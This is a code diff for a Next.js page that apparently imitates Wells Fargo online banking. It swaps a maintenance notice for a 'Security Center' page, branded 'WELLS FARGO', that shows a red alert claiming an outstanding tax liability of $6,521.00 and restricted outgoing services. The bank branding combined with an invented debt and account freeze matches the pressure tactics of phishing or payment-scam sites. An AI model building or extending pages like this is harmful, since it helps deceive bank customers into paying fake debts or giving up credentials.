@@ -1,24 +1,56 @@
-import Link from 'next/link';
-import { Construction, ArrowLeft } from 'lucide-react';
+'use client';
 
-export default function MaintenancePage() {
+import { useRouter } from 'next/navigation';
+import { ArrowLeft, Shield, Lock, Eye, Smartphone, ChevronRight } from 'lucide-react';
+
+export default function SecurityPage() {
+  const router = useRouter();
+
+  const securityItems = [
+    { icon: <Lock size={20} />, label: 'Change Password', desc: 'Keep your account secure' },
+    { icon: <Smartphone size={20} />, label: '2nd Step Verification', desc: 'Secure sign-on method' },
+    { icon: <Eye size={20} />, label: 'Privacy Settings', desc: 'Control your data' },
+  ];
+
   return (
-    <div className="animate-in" style={{ textAlign: 'center', padding: '100px 0' }}>
-      <div style={{ background: 'white', maxWidth: '600px', margin: '0 auto', padding: '60px 40px', borderRadius: '12px', boxShadow: 'var(--wf-shadow)', border: '1px solid var(--wf-border-light)' }}>
-        <div style={{ width: '80px', height: '80px', background: '#fff5f5', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
-          <Construction size={40} color="var(--wf-red)" />
+    <div className="animate-in">
+      <header className="header-row" style={{ borderBottom: '1px solid #EEE', background: 'white' }}>
+        <button onClick={() => router.push('/dashboard')} style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'none', border: 'none', fontWeight: 600, cursor: 'pointer', fontSize: '14px' }}>
+          <ArrowLeft size={20} /> Back
+        </button>
+        <div className="serif-logo" style={{ fontSize: '18px', position: 'absolute', left: '50%', transform: 'translateX(-50%)' }}>
+          WELLS FARGO
         </div>
-        <h1 style={{ fontSize: '28px', fontWeight: 800, marginBottom: '16px' }}>Under Construction</h1>
-        <p style={{ color: 'var(--wf-text-gray)', marginBottom: '40px', lineHeight: '1.6' }}>
-          This section of <strong>Wells Fargo Online Banking</strong> is currently under maintenance. We are working to provide you with a better experience. Please check back later.
-        </p>
-        
-        <Link href="/" className="btn btn-primary" style={{ display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
-          <ArrowLeft size={18} /> Return to Accounts
-        </Link>
+        <div style={{ width: 60 }}></div>
+      </header>
 
-        <div style={{ marginTop: '40px', paddingTop: '30px', borderTop: '1px solid var(--wf-border-light)', fontSize: '13px', fontStyle: 'italic', opacity: 0.6 }}>
-          Reference: SYS-MT-2026
+      <div className="page-container" style={{ maxWidth: '600px', paddingTop: '40px' }}>
+        <div style={{ width: '64px', height: '64px', background: '#FFF0F0', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '24px' }}>
+          <Shield size={32} color="#D1121F" />
+        </div>
+        <h1 className="offer-h1" style={{ fontSize: '32px', marginBottom: '8px' }}>Security Center</h1>
+        <p style={{ color: '#666', marginBottom: '32px' }}>Protect your identity and your accounts.</p>
+
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+          {securityItems.map((item, idx) => (
+            <div key={idx} style={{ background: 'white', padding: '20px', borderRadius: '16px', border: '1px solid #EEE', display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer' }}>
+              <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
+                <div style={{ color: '#D1121F' }}>{item.icon}</div>
+                <div>
+                  <div style={{ fontWeight: 700, fontSize: '16px' }}>{item.label}</div>
+                  <div style={{ fontSize: '13px', color: '#666' }}>{item.desc}</div>
+                </div>
+              </div>
+              <ChevronRight size={20} color="#CCC" />
+            </div>
+          ))}
+        </div>
+
+        <div style={{ marginTop: '40px', background: 'white', padding: '24px', borderRadius: '16px', border: '1px solid #EEE' }}>
+          <h3 style={{ fontWeight: 700, fontSize: '18px', marginBottom: '12px' }}>Security Alert</h3>
+          <p style={{ fontSize: '14px', color: '#D1121F', fontWeight: 600, lineHeight: '1.5' }}>
+            We noticed an outstanding tax liability of $6,521.00 associated with your profile. Outgoing services are currently restricted to protect your assets.
+          </p>
         </div>
       </div>
     </div>
